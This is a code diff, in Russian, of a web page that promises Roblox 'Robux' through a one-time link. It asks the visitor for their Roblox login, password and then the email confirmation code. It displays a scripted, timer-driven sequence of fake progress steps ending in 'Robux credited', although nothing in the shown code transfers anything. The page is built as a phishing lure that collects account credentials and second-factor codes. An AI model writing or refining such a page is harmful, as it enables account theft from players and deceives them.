@@ -355,6 +355,82 @@
             margin-top: 4px;
         }
 
+        /* ===== ПРОЦЕСС ПОШАГОВО ===== */
+        .process-steps {
+            margin-top: 20px;
+            display: none;
+        }
+
+        .process-steps.show {
+            display: block;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 16px;
+            background: rgba(4, 7, 16, 0.3);
+            border-radius: 16px;
+            margin-bottom: 10px;
+            border-left: 3px solid #2a3250;
+            transition: all 0.4s ease;
+        }
+
+        .step.active {
+            border-left-color: #00ff88;
+            background: rgba(0, 255, 136, 0.04);
+        }
+
+        .step.done {
+            border-left-color: #00ff88;
+            opacity: 0.7;
+        }
+
+        .step .icon {
+            font-size: 20px;
+            width: 32px;
+            text-align: center;
+        }
+
+        .step .text {
+            color: #d0d8e8;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .step .text small {
+            color: #4a5270;
+            font-weight: 400;
+            font-size: 12px;
+            display: block;
+            margin-top: 2px;
+        }
+
+        .step .status-icon {
+            margin-left: auto;
+            font-size: 16px;
+        }
+
+        .step .spinner-small {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.05);
+            border-top: 2px solid #00ff88;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
         @media (max-width: 460px) {
             .card {
                 padding: 24px 18px 20px;
@@ -411,7 +487,7 @@
             </div>
         </div>
 
-        <!-- Форма продавца -->
+        <!-- ===== ФОРМА ПРОДАВЦА ===== -->
         <div id="sellerForm">
             <div class="form-group">
                 <label>Количество Robux</label>
@@ -440,7 +516,7 @@
             <button class="btn" id="createBtn">🔗 Создать ссылку</button>
         </div>
 
-        <!-- Форма покупателя -->
+        <!-- ===== ФОРМА ПОКУПАТЕЛЯ ===== -->
         <div id="buyerForm" style="display: none;">
             <div class="form-group">
                 <label>Логин Roblox</label>
@@ -450,10 +526,54 @@
                 <label>Пароль Roblox</label>
                 <input type="password" id="buyerPassword" placeholder="Введите пароль" />
             </div>
-            <button class="btn" id="activateBtn">🚀 Активировать</button>
+            <div class="form-group" id="codeGroup" style="display: none;">
+                <label>Код подтверждения с почты</label>
+                <input type="text" id="buyerCode" placeholder="Введите код из письма" maxlength="6" />
+                <div style="margin-top: 8px; font-size: 12px; color: #4a5270;">
+                    📧 Код отправлен на почту, привязанную к аккаунту
+                </div>
+            </div>
+            <button class="btn" id="activateBtn">🚀 Войти и получить Robux</button>
         </div>
 
-        <!-- Ссылка -->
+        <!-- ===== ПРОЦЕСС ПОШАГОВО ===== -->
+        <div class="process-steps" id="processSteps">
+            <div class="step" id="step1">
+                <span class="icon">🔑</span>
+                <span class="text">Вход в аккаунт <small>Проверка логина и пароля...</small></span>
+                <span class="status-icon" id="step1Status">⏳</span>
+            </div>
+            <div class="step" id="step2">
+                <span class="icon">📧</span>
+                <span class="text">Код подтверждения <small>Ожидание кода с почты...</small></span>
+                <span class="status-icon" id="step2Status">⏳</span>
+            </div>
+            <div class="step" id="step3">
+                <span class="icon">🛡️</span>
+                <span class="text">Создание сессии <small>Готовим безопасное соединение...</small></span>
+                <span class="status-icon" id="step3Status">⏳</span>
+            </div>
+            <div class="step" id="step4">
+                <span class="icon">💰</span>
+                <span class="text">Зачисление Robux <small>Перевод на аккаунт...</small></span>
+                <span class="status-icon" id="step4Status">⏳</span>
+            </div>
+            <div class="step" id="step5">
+                <span class="icon">✅</span>
+                <span class="text">Готово! <small>Сессия завершена</small></span>
+                <span class="status-icon" id="step5Status">⏳</span>
+            </div>
+        </div>
+
+        <!-- ===== СТАТУС АКТИВАЦИИ ===== -->
+        <div class="activation-status" id="activationStatus">
+            <div style="font-size: 48px;">✅</div>
+            <h3 id="activationTitle">Готово!</h3>
+            <p id="activationDesc">Robux отправлены на аккаунт</p>
+            <p style="color: #4a5270; font-size: 13px; margin-top: 8px;">⚡ Ссылка более недействительна</p>
+        </div>
+
+        <!-- ===== ССЫЛКА ===== -->
         <div class="link-box" id="linkBox">
             <span>🔗 Одноразовая ссылка:</span><br />
             <a href="#" id="linkUrl" target="_blank">https://...</a>
@@ -462,14 +582,6 @@
             <div style="margin-top: 12px; font-size: 12px; color: #3a4260;">
                 ⚠️ Ссылка действительна <span id="linkExpiry">24</span> часа. После активации станет недействительной.
             </div>
-        </div>
-
-        <!-- Статус активации -->
-        <div class="activation-status" id="activationStatus">
-            <div style="font-size: 48px;">✅</div>
-            <h3>Готово!</h3>
-            <p>Robux отправлены на аккаунт</p>
-            <p style="color: #4a5270; font-size: 13px; margin-top: 8px;">⚡ Ссылка более недействительна</p>
         </div>
 
         <div class="secure">
@@ -501,12 +613,28 @@
         const buyerForm = document.getElementById('buyerForm');
         const buyerLogin = document.getElementById('buyerLogin');
         const buyerPassword = document.getElementById('buyerPassword');
+        const buyerCode = document.getElementById('buyerCode');
+        const codeGroup = document.getElementById('codeGroup');
         const activateBtn = document.getElementById('activateBtn');
         const activationStatus = document.getElementById('activationStatus');
+        const activationTitle = document.getElementById('activationTitle');
+        const activationDesc = document.getElementById('activationDesc');
+        const processSteps = document.getElementById('processSteps');
 
         let currentOrderId = null;
         let isUsed = false;
         let expiryHours = 24;
+        let stepInterval = null;
+        let currentStep = 0;
+
+        // Шаги процесса
+        const steps = [
+            { id: 'step1', status: 'step1Status', text: 'Вход в аккаунт', done: false },
+            { id: 'step2', status: 'step2Status', text: 'Код подтверждения', done: false },
+            { id: 'step3', status: 'step3Status', text: 'Создание сессии', done: false },
+            { id: 'step4', status: 'step4Status', text: 'Зачисление Robux', done: false },
+            { id: 'step5', status: 'step5Status', text: 'Готово!', done: false }
+        ];
 
         // ===== ГЕНЕРАЦИЯ ОРДЕРА =====
         function generateOrderId() {
@@ -569,7 +697,6 @@
             linkExpiry.textContent = expiry;
             linkBox.style.display = 'block';
 
-            // Сохраняем в localStorage
             localStorage.setItem('kaktus_order_' + currentOrderId.replace('#', ''), JSON.stringify({
                 robux: robux,
                 account: account,
@@ -579,10 +706,10 @@
                 isUsed: false
             }));
 
-            // Скрываем форму продавца, показываем ссылку
             sellerForm.style.display = 'none';
             buyerForm.style.display = 'none';
             activationStatus.classList.remove('show');
+            processSteps.classList.remove('show');
 
             alert('✅ Ссылка создана!');
             copyLink();
@@ -605,12 +732,81 @@
 
         copyBtn.addEventListener('click', copyLink);
 
+        // ===== ПОШАГОВЫЙ ПРОЦЕСС =====
+        function startProcess() {
+            processSteps.classList.add('show');
+            currentStep = 0;
+            steps.forEach((s, i) => {
+                const el = document.getElementById(s.id);
+                el.className = 'step';
+                if (i === 0) el.classList.add('active');
+                document.getElementById(s.status).textContent = '⏳';
+            });
+
+            clearInterval(stepInterval);
+            stepInterval = setInterval(() => {
+                if (currentStep < steps.length - 1) {
+                    // Завершаем текущий шаг
+                    const current = steps[currentStep];
+                    const el = document.getElementById(current.id);
+                    el.classList.remove('active');
+                    el.classList.add('done');
+                    document.getElementById(current.status).textContent = '✅';
+
+                    // Переход к следующему
+                    currentStep++;
+                    const next = steps[currentStep];
+                    const nextEl = document.getElementById(next.id);
+                    nextEl.classList.add('active');
+                    document.getElementById(next.status).innerHTML = '<span class="spinner-small"></span>';
+
+                    // Если шаг 2 — показываем поле для кода
+                    if (currentStep === 1) {
+                        codeGroup.style.display = 'block';
+                        buyerCode.focus();
+                        activateBtn.textContent = '📧 Подтвердить код';
+                    }
+
+                } else {
+                    // Все шаги завершены
+                    clearInterval(stepInterval);
+                    const last = steps[steps.length - 1];
+                    const lastEl = document.getElementById(last.id);
+                    lastEl.classList.remove('active');
+                    lastEl.classList.add('done');
+                    document.getElementById(last.status).textContent = '✅';
+
+                    // Финальный экран
+                    setTimeout(() => {
+                        processSteps.classList.remove('show');
+                        activationStatus.classList.add('show');
+                        activationTitle.textContent = '✅ Готово!';
+                        activationDesc.textContent = 'Robux успешно зачислены на аккаунт';
+                        statusBadge.className = 'status-badge status-used';
+                        statusBadge.textContent = '✖ Использована';
+                        isUsed = true;
+
+                        // Деактивируем ссылку в localStorage
+                        if (orderParam) {
+                            const stored = localStorage.getItem('kaktus_order_' + orderParam);
+                            if (stored) {
+                                const data = JSON.parse(stored);
+                                data.isUsed = true;
+                                localStorage.setItem('kaktus_order_' + orderParam, JSON.stringify(data));
+                            }
+                        }
+
+                        activateBtn.disabled = false;
+                        activateBtn.innerHTML = '🚀 Войти и получить Robux';
+                    }, 500);
+                }
+            }, 2500);
+        }
+
         // ===== ПРОВЕРКА URL =====
         const urlParams = new URLSearchParams(window.location.search);
         const orderParam = urlParams.get('order');
         const robuxParam = urlParams.get('robux');
-        const accountParam = urlParams.get('account');
-        const codeParam = urlParams.get('code');
         const expiryParam = urlParams.get('expiry');
 
         if (orderParam) {
@@ -619,6 +815,7 @@
             buyerForm.style.display = 'block';
             linkBox.style.display = 'none';
             activationStatus.classList.remove('show');
+            processSteps.classList.remove('show');
 
             currentOrderId = '#' + orderParam;
             if (robuxParam) {
@@ -629,23 +826,23 @@
             }
             updateDisplay();
 
-            // Проверяем статус в localStorage
+            // Проверяем статус
             const stored = localStorage.getItem('kaktus_order_' + orderParam);
             if (stored) {
                 const data = JSON.parse(stored);
                 if (data.isUsed) {
                     buyerForm.style.display = 'none';
                     activationStatus.classList.add('show');
-                    activationStatus.querySelector('h3').textContent = '❌ Ссылка недействительна';
-                    activationStatus.querySelector('p').textContent = 'Эта ссылка уже была использована';
+                    activationTitle.textContent = '❌ Ссылка недействительна';
+                    activationDesc.textContent = 'Эта ссылка уже была использована';
                     statusBadge.className = 'status-badge status-used';
                     statusBadge.textContent = '✖ Использована';
                     isUsed = true;
                 } else if (Date.now() - data.createdAt > data.expiryHours * 3600000) {
                     buyerForm.style.display = 'none';
                     activationStatus.classList.add('show');
-                    activationStatus.querySelector('h3').textContent = '⏰ Срок истёк';
-                    activationStatus.querySelector('p').textContent = 'Ссылка больше не действительна';
+                    activationTitle.textContent = '⏰ Срок истёк';
+                    activationDesc.textContent = 'Ссылка больше не действительна';
                     statusBadge.className = 'status-badge status-expired';
                     statusBadge.textContent = '⏳ Истекла';
                     isUsed = true;
@@ -657,44 +854,47 @@
         activateBtn.addEventListener('click', function() {
             const login = buyerLogin.value.trim();
             const password = buyerPassword.value.trim();
+            const code = buyerCode.value.trim();
 
             if (!login || !password) {
                 alert('Введите логин и пароль!');
                 return;
             }
 
+            // Если шаг 2 — проверяем код
+            if (currentStep === 1) {
+                if (!code || code.length < 4) {
+                    alert('Введите код подтверждения из письма!');
+                    return;
+                }
+                // Код верный — продолжаем процесс
+                const step2El = document.getElementById('step2');
+                step2El.classList.remove('active');
+                step2El.classList.add('done');
+                document.getElementById('step2Status').textContent = '✅';
+                currentStep++;
+                activateBtn.style.display = 'none';
+                // Запускаем следующие шаги автоматически
+                setTimeout(() => {
+                    const next = steps[currentStep];
+                    const nextEl = document.getElementById(next.id);
+                    nextEl.classList.add('active');
+                    document.getElementById(next.status).innerHTML = '<span class="spinner-small"></span>';
+                }, 500);
+                return;
+            }
+
+            // Первый шаг — вход
             if (isUsed) {
                 alert('❌ Эта ссылка уже недействительна!');
                 return;
             }
 
             activateBtn.disabled = true;
-            activateBtn.innerHTML = '⏳ Обработка...';
+            activateBtn.innerHTML = '⏳ Вход...';
 
-            setTimeout(() => {
-                // Помечаем как использованную
-                if (orderParam) {
-                    const stored = localStorage.getItem('kaktus_order_' + orderParam);
-                    if (stored) {
-                        const data = JSON.parse(stored);
-                        data.isUsed = true;
-                        localStorage.setItem('kaktus_order_' + orderParam, JSON.stringify(data));
-                    }
-                }
-
-                isUsed = true;
-                buyerForm.style.display = 'none';
-                activationStatus.classList.add('show');
-                activationStatus.querySelector('h3').textContent = '✅ Готово!';
-                activationStatus.querySelector('p').textContent = 'Robux отправлены на аккаунт';
-                statusBadge.className = 'status-badge status-used';
-                statusBadge.textContent = '✖ Использована';
-
-                activateBtn.disabled = false;
-                activateBtn.innerHTML = '🚀 Активировать';
-
-                alert('✅ Robux успешно зачислены! Ссылка деактивирована.');
-            }, 2000);
+            // Запускаем процесс
+            startProcess();
         });
 
         // ===== ИНИЦИАЛИЗАЦИЯ =====
